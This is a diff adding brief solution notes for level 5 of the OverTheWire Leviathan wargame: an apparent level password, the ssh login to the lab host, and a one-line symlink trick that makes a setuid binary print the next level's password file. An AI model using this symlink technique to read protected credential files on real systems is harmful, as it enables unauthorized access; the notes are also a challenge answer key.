@@ -1,0 +1,4 @@
+UgaoFee4li
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+[create a symlink to leviathan6 password file and execute leviathan5 binary]
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log && ./leviathan5
